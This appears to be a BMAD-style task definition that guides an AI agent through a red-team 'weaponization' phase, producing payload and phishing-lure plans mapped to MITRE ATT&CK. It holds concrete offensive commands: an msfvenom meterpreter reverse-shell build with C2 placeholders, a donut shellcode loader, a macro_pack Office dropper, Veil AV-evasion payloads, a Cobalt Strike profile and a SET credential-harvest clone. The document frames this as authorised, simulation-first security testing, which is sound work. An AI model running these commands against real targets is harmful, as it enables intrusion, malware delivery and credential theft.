<!-- Powered by BMAD(R) Core -->

# Task: weaponization-phase

## Purpose
- Transform recon findings into simulated payload and lure plans that respect ROE and MITRE ATT&CK.
- Produce docs/red-team/payload-report.md outlining payload concepts, observables, and defensive countermeasures.

## Prerequisites
- docs/red-team/recon-report.md
- Approved payload families, allowed delivery vectors, and infrastructure constraints.
- Workspace directories: build/payloads, build/lures, build/profiles, reports/weaponization.

## Success Criteria
- Payload concepts trace back to recon exposures and mission objectives.
- Each payload/lure includes prerequisites, required tooling, observables, detections, mitigation notes, and kill-switch guidance.
- Documentation aligns with TA0042 (Resource Development) and TA0001 (Initial Access) techniques.
- Handoff package equips Delivery Agent with staging requirements and critical risks.

## Safety & Compliance
- Simulation-only by default; do not generate functional malware unless explicitly authorised and contained.
- Sanitise or tokenize credentials, domains, and binaries before sharing artefacts.
- Record all generated files under build/ with hashes and delete them when no longer needed.

## Recommended Tooling
| Tool | Command | Goal | Expected Output |
| --- | --- | --- | --- |
| msfvenom | `msfvenom -p windows/x64/meterpreter_reverse_https LHOST={{c2_host}} LPORT={{c2_port}} -f exe -o build/payloads/meterpreter-{{timestamp}}.exe` | Generate reference payload binary for documentation/detection. | Executable with build summary and SHA256 hash. |
| donut | `donut -f build/payloads/custom.bin -o build/payloads/custom-loader-{{timestamp}}.js` | Transform shellcode into scriptable loader for macro/HTA scenarios. | JavaScript loader file with metadata in console output. |
| macro_pack | `macro_pack.exe -t DROPPER -f docs/templates/decoy.docm -o build/lures/macro-dropper-{{timestamp}}.docm` | Embed simulated macro dropper within Office document. | Lure document plus console log of injected macros. |
| veil | `python3 /opt/veil/Veil.py --generate --payload python/shellcode_inject --output-name sim-{{timestamp}}` | Document AV-evasion workflow (simulation). | Build log referencing output payload path (if any). |
| cobaltstrike profile | `beaconizer profile generate --profile configs/https-client.yml --out build/profiles/https-client-{{timestamp}}.profile` | Produce malleable Beacon profile for C2 planning and defensive review. | Profile file with headers, jitter, watermark values. |
| setoolkit | `setoolkit --noprompt --template credharvest --url {{phish_url}} --port 443` | Simulate credential harvesting lure to inform delivery planning. | Toolkit log containing cloned site path and captured fields. |

## Procedure
1. Review docs/red-team/recon-report.md. Extract prioritized exposures, technology stacks, and defensive telemetry references.
2. Confirm allowed payload families (e.g., reverse shell, credential harvester) and lure vectors with stakeholders. Record constraints in working notes.
3. For each candidate payload concept:
   - Identify prerequisite access, required staging infrastructure, and defender visibility.
   - Map to ATT&CK techniques (e.g., T1566.001 Spearphishing Attachment, T1204.002 Malicious File).
4. Using approved tooling, generate or simulate payload artefacts (msfvenom, donut, macro_pack, veil). Store outputs under build/ with timestamped filenames. Document command logs in reports/weaponization.
5. Design lure narratives (email, web, physical) referencing recon data (employee roles, domains). Capture sample content, social engineering hooks, and imagery requirements.
6. For each payload/lure, document:
   - Execution flow and dependencies (e.g., requires macro enablement, needs staging server).
   - Observables (file hashes, network callbacks, registry keys).
   - Detection and mitigation (EDR rules, mail gateway controls, user awareness cues).
   - Kill-switches and rollback procedures.
7. Populate docs/red-team/payload-report.md via template sections (Summary, Inputs, Payload Concepts, Lure Design, Detections, ATT&CK mapping, Delivery handoff).
8. Verify artefacts meet ROE (no live C2, safe infrastructure). Hash files and capture metadata in appendices.
9. Prepare handoff brief for Delivery Agent summarising approved payloads, lure requirements, and staging checklist items.

## Decision Gates
- **ROE Approval**: pause if payload type or lure channel exceeds authorised actions.
- **Detection Risk**: recommend alternate approach if detection likelihood is unacceptably high without mission value.
- **Infrastructure Readiness**: ensure C2 or staging infrastructure is available (or plan for simulation-only documentation).

## Outputs
- `docs/red-team/payload-report.md`
- Artefacts in `build/payloads`, `build/lures`, `build/profiles`, with logs in `reports/weaponization`
- Handoff summary for Delivery Agent.
